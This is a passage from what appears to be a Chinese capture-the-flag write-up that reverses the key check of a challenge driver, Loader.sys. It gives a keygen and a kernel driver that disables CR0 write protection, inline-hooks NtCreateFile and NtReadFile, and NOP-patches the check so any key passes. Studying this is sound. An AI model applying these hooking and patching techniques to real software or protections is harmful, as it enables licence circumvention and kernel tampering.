%d:xia0ji233: NtCreateFile=%p NtReadFile=%p\n"</span>), __LINE__, target,target2);    g_Object = DriverObject;<br />    <span style="color: rgb(150, 203, 254);">if</span> (target&amp;&amp;target2) {<br />        <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(oldcode); i++) {            oldcode[i] = target[i];            oldcode2[i] = target2[i];        }<br />        *(UINT64*)(newcode + <span style="color: rgb(255, 115, 253);">2</span>) = myCreateFile;<br />        *(UINT64*)(newcode2 + <span style="color: rgb(255, 115, 253);">2</span>) = myReadFile;        Hook();        Hook2();    }<br />    <span style="color: rgb(150, 203, 254);">else</span> {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"xia0ji233:hahaha"</span>));    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>跟到后面可以找到文件内容（ReadFile第六个参数），在文件内容处下硬件读取断点，可以找到这里文件内容被被写入两个寄存器，随后又写入另外的内存（RCX所指向的内存）。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ad99fb11&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePDDcNJlQQUCzk5StFkyhFMcLRS36CL9bmL3NHqKT2qcphl4foo50jQQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>然后就直接 ret 了，这里将内存窗口转到 RCX 指向的地址，然后程序跳出来。</p><p>紧接着给末尾添 0 字节，然后将 r14 与 0x10 比较，小于跳出</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=e2af7523&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePMvSEKJhLQO5TNkFTQpns8XoHgwnW4IX23ULh8ibLE2g0uF3pyiazRqdQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这一次输出失败了，于是考虑换长度但是改一个字符，发现在另外的位置写了零字节</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=4ee4a8dd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePl8uB5MLvdVff9qWnsz0TtGke3yPqET8xRCNQJfR2dx9Ow7Xxxu5fHw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>在跟的过程中，发现后面的一个内存就是长度</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=fc89fb51&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePqibzzINA2icfwCibOLkXOVllEcmCyoVN5pELY8OhLEweicib533Dnoc4pnA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>然后接着跟，会跟到一个找 - 的代码</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=5a8a50de&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePZ2YWd7O2hqicP9QzlBy9d0shQ9VGqCtXSMckC6myibsZO0bjfgiaJNPwg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>很容易理解，因为 - 就是分隔 user 和 key 的，必然有一个遍历在找 - 的位置，那就直接跳到它找到了 - 的位置，发现有一个大跳转</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=58c72587&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePCAo6NMB4tsp5AUwEK5m8Nae890MOEOQGibOfFr5LXhia6YFKKBqCGQfg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>随后会把 - 所处的地址存入栈中</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=848d08db&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePO6Yick8Y4tiaTgq9uMamo60uyWaye3AD8msL1DfeEpg1MUh1SYDqPd9Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>紧接着跟，发现把User拷贝到下面的内存了</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=f32e08f0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePRVnzYn6J0wX0JVEqBFk7stWhlpuMP8a7Q4aagznaUya8jOGFgVyVyQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>随后将key也写入下方的内存</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=9620b3d4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePJGWjF8jsrk5KTb7XFJ9oRcJDJOZLicKkoAmBFHu3nMicGwvlBTUBzSvw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>然后开始循环 key，判断如果 -0x30 是否 &gt;10，应该 key 只能是数字的判断。</p><p>于是我在循环这里下了一个软件断点，发现 RDI 会存储当前已遍历的十进制。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=e3ab6ceb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePxhdem5ibHmB49PGnlc9y0y5yLU17PIdtcfLibNGMN5nHjbP1mlCyiclaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>例如现在已经遍历到了 405，那么 rdi=0x195=405。</p><p>经过数次的循环，</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=86c98c28&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePTLuib7wRVlWJRAK4czsbObIeb6zVt3CDBktvPongApHucdyCiafdG1ug%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>可以发现 RDI=0xF17E203C，就是 4051574844，那么接下来就往下面跟看看跟 User 有什么样的关系。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=948e66d2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePibvjX2UY9qibRzx8Dp7uXhabwOpUnM6MqQR7VN5E2TY713vhDUP5eDhg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>取出ACE之后算出一个值 0x0000000020450083，最后很 0x1003F 相乘，得到 00000000F17E203D，刚好是题目所给 key 的十六进制表示。</p><p>后面通过一定的调试分析，发现一个规律</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=56562a51&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePMgzMs8lJZLgWAKHMammaWuKbjn5N8CZpdLc0DbFy5vQDFeSianFlbKg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>似乎它会把每一个字符加起来然后 <code style="font-family: SFMono-Regular, Consolas, ;">*0x1003F</code>，并且一定是 <code style="font-family: SFMono-Regular, Consolas, ;">int</code>。</p><p>先验证一遍ACE是否正确</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=3eec1fab&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePnqAeia4UkpeS0wQX5Cu91JTMeRnaxvic369cU7kcOsq7F5w0IwceJCIQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>发现果然如此，那么照样子算出 key 为 <code style="font-family: SFMono-Regular, Consolas, ;">4007951923</code>。</p><h4>编写一个keygen，能生成对于任何用户名的KEY（1分）</h4><p>根据上面的分析，不难写出 keygen 程序</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;string.h&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(255, 255, 182);">char</span> user[]=<span style="color: rgb(168, 255, 96);">"xia0ji233"</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> n=strlen(user);<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> key=<span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(150, 203, 254);">for</span>(<span style="color: rgb(255, 255, 182);">int</span> i=<span style="color: rgb(255, 115, 253);">0</span>;i&lt;n;i++){<br />        key=(key+user[i])*<span style="color: rgb(255, 115, 253);">0x1003F</span>;    }<br />    printf(<span style="color: rgb(168, 255, 96);">"%u\n"</span>,key);<br />}</code></pre><p>运行即可获得 key 的输出。</p><h4>编写一个exp，在exp程序运行后，对于任意的用户名-key，Loader.sys均能正确启动（1分）</h4><p>有这么几种方法：监控内核线程，在 shellcode 执行的时候拦截，把比较是否相等的代码patch掉。监控文件读写，在读文件的时候，判断如果是目标文件，让它返回正确的结果。</p><p>最后还是选择在文件处拦截，然后趁它读文件的时候遍历驱动模块改它代码，上面分析的 imul 关键指令在 <code style="font-family: SFMono-Regular, Consolas, ;">Loader.sys+0xafc1c4</code> 的位置</p><p>再调试一遍，决出关键一步，找到了 cmp 指令</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=27442cd0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePl506Jp9IxtGYI0Oa6vfqf13oRrqicDicrlyJe5Y7My0Lpq2sxSQoqVPg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>如图所示的内存分别为实际输入的数值和通过 user 计算得到的key的数值，随后取出相比较，不相等显然跳转到 Fail 分支，因此这里改成 NOP 让它不跳转任意情况下跳转成功。</p><p>此时的 sys 基地址为 <code style="font-family: SFMono-Regular, Consolas, ;">0xFFFFF806F82D0000</code>，与该指令相减得到 <code style="font-family: SFMono-Regular, Consolas, ;">0xa27e</code> 的偏移，只需把这两个字节改成 0x90 即可达到任意的 user key 可以成功加载驱动。</p><p>我先使用了hook的方式去劫持，确保劫持的函数没错，再通过修改劫持时机和方式让方法满足要求</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntdef.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstatus.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_BACKTRACE_DEPTH 20</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SYMBOL <span style="color: rgb(168, 255, 96);">L"\\??\\xia0ji2333"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br />UINT64 BaseAddr=<span style="color: rgb(198, 197, 254);">NULL</span>, DLLSize=<span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">DeleteDevice</span>(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start delete device\n"</span>), __LINE__);<br />    <span style="color: rgb(150, 203, 254);">if</span> (pDriver-&gt;DeviceObject) {        UNICODE_STRING Sym;<br />        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span style="color: rgb(146, 255, 184);">//CreateFile </span><br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Symbol\n"</span>), __LINE__);        IoDeleteSymbolicLink(&amp;Sym);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Device\n"</span>), __LINE__);        IoDeleteDevice(pDriver-&gt;DeviceObject);    }<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: end delete device\n"</span>), __LINE__);}<br />HANDLE FileHandler = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(255, 255, 182);">char</span> newcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(146, 255, 184);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span><span style="color: rgb(146, 255, 184);">//jmp rax</span>};<br /><span style="color: rgb(255, 255, 182);">char</span> oldcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,};<br /><span style="color: rgb(255, 255, 182);">char</span> newcode2[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(146, 255, 184);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span><span style="color: rgb(146, 255, 184);">//jmp rax</span>};<br /><span style="color: rgb(255, 255, 182);">char</span> oldcode2[] = {<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,};<br /><span style="color: rgb(255, 255, 182);">char</span>* target;<br /><span style="color: rgb(255, 255, 182);">char</span>* target2;<br />KIRQL <span style="color: rgb(255, 255, 182);">WPOFFx64</span>(){    KIRQL irql = KeRaiseIrqlToDpcLevel();    UINT64 cr0 = __readcr0();<br />    cr0 &amp;= <span style="color: rgb(255, 115, 253);">0xfffffffffffeffff</span>;    __writecr0(cr0);    _disable();<br />    <span style="color: rgb(150, 203, 254);">return</span> irql;}<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">WPONx64</span>(KIRQL irql){    UINT64 cr0 = __readcr0();<br />    cr0 |= <span style="color: rgb(255, 115, 253);">0x10000</span>;    _enable();    __writecr0(cr0);    KeLowerIrql(irql);}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Unhook</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode); i++) {        target[i] = oldcode[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Unhook2</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode2); i++) {        target2[i] = oldcode2[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Hook</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode); i++) {        target[i] = newcode[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Hook2</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode2); i++) {        target2[i] = newcode2[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LDR_DATA_TABLE_ENTRY</span> {    LIST_ENTRY InLoadOrderLinks;    LIST_ENTRY InMemoryOrderLinks;    LIST_ENTRY InInitializationOrderLinks;    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(146, 255, 184);">//驱动的进入点 DriverEntry  </span>    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(146, 255, 184);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(146, 255, 184);">//不带路径的驱动名字  </span>    ULONG Flags;    USHORT LoadCount;    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID SectionPointer;            ULONG CheckSum;        };    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            ULONG TimeDateStamp;        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID LoadedImports;        };    };} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (* FuncPtr) (    _Out_ PHANDLE FileHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _In_opt_ PLARGE_INTEGER AllocationSize,    _In_ ULONG FileAttributes,    _In_ ULONG ShareAccess,    _In_ ULONG CreateDisposition,    _In_ ULONG CreateOptions,    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,    _In_ ULONG EaLength    );<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (* FuncPtr2 )(    _In_ HANDLE FileHandle,    _In_opt_ HANDLE Event,    _In_opt_ PIO_APC_ROUTINE ApcRoutine,    _In_opt_ PVOID ApcContext,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _Out_writes_bytes_(Length) PVOID Buffer,    _In_ ULONG Length,    _In_opt_ PLARGE_INTEGER ByteOffset,    _In_opt_ PULONG Key    );<br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>();<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (*ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_PROCESS_INFORMATION</span> {    ULONG NextEntryOffset;    ULONG NumberOfThreads;<br />    LARGE_INTEGER Reserved[<span style="color: rgb(255, 115, 253);">3</span>];    LARGE_INTEGER CreateTime;    LARGE_INTEGER UserTime;    LARGE_INTEGER KernelTime;    UNICODE_STRING ImageName;    ULONG BasePriority;    HANDLE ProcessId;    HANDLE InheritedFromProcessId;} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_THREAD_INFORMATION</span> {    LARGE_INTEGER KernelTime;    LARGE_INTEGER UserTime;    LARGE_INTEGER CreateTime;    ULONG WaitTime;    PVOID StartAddress;    CLIENT_ID ClientId;    ULONG Priority;    LONG BasePriority;    ULONG ContextSwitchCount;    LONG State;    LONG WaitReason;} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_INFORMATION_CLASS</span> {<br />    SystemProcessInformation = <span style="color: rgb(255, 115, 253);">5</span>} SYSTEM_INFORMATION_CLASS;<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SystemModuleInformation 11</span><br />ULONG  <span style="color: rgb(255, 255, 182);">myCreateFile</span>(_Out_ PHANDLE FileHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _In_opt_ PLARGE_INTEGER AllocationSize,    _In_ ULONG FileAttributes,    _In_ ULONG ShareAccess,    _In_ ULONG CreateDisposition,    _In_ ULONG CreateOptions,    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,    _In_ ULONG EaLength) {    Unhook();    FuncPtr func = (FuncPtr)target;    NTSTATUS s = func(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!wcscmp(ObjectAttributes-&gt;ObjectName-&gt;Buffer, <span style="color: rgb(168, 255, 96);">L"\\??\\C:\\card.txt"</span>)) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"call NtCreateFile(%p,%p,%S,%p,%p,%p,%p,%p,%p,%p,%p)\n"</span>), FileHandle,DesiredAccess,ObjectAttributes-&gt;ObjectName-&gt;Buffer,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);<br />        <span style="color: rgb(146, 255, 184);">//DbgBreakPoint();</span>        FileHandler = *FileHandle;    }<br />    <span style="color: rgb(146, 255, 184);">//DbgBreakPoint();</span>    Hook();<br />    <span style="color: rgb(150, 203, 254);">return</span> s;}MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize){<br />    PMDL pMdl = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    PVOID pNewAddress = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    pMdl = MmCreateMdl(<span style="color: rgb(198, 197, 254);">NULL</span>, pBaseAddress, writeDataSize);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pMdl)    {<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }    MmBuildMdlForNonPagedPool(pMdl);    pNewAddress = MmMapLockedPages(pMdl, KernelMode);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pNewAddress)    {        IoFreeMdl(pMdl);    }    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);    MmUnmapLockedPages(pNewAddress, pMdl);    IoFreeMdl(pMdl);<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;}<br />VOID <span style="color: rgb(255, 255, 182);">PatchInstr</span>(){    LDR_DATA_TABLE_ENTRY *TE, *Tmp;    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;    PLIST_ENTRY LinkList;    ;<br />    <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>;    LinkList = TE-&gt;InLoadOrderLinks.Flink;      UNICODE_STRING name;<br />    RtlInitUnicodeString(&amp;name,<span style="color: rgb(168, 255, 96);">L"Loader.sys"</span>);    ;<br />    <span style="color: rgb(150, 203, 254);">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)    {        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;<br />        <span style="color: rgb(150, 203, 254);">if</span> (RtlEqualUnicodeString(&amp;Tmp-&gt;BaseDllName, &amp;name,FALSE)) {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"DLLname:%S DLLBase=%p nowcode=%p\n"</span>), Tmp-&gt;BaseDllName.Buffer,Tmp-&gt;DllBase,(ULONG64)(Tmp-&gt;DllBase) + <span style="color: rgb(255, 115, 253);">0xa27e</span>);<br />            <span style="color: rgb(255, 255, 182);">char</span> buffer[] = { <span style="color: rgb(255, 115, 253);">0x90</span>,<span style="color: rgb(255, 115, 253);">0x90</span> };<br />            MDLWriteMemory((ULONG64)(Tmp-&gt;DllBase) + <span style="color: rgb(255, 115, 253);">0xa27e</span>, buffer, <span style="color: rgb(255, 115, 253);">2</span>);<br />            <span style="color: rgb(150, 203, 254);">return</span>;        }        LinkList = LinkList-&gt;Flink;        i++;    }}<br />ULONG <span style="color: rgb(255, 255, 182);">myReadFile</span>(    _In_ HANDLE FileHandle,    _In_opt_ HANDLE Event,    _In_opt_ 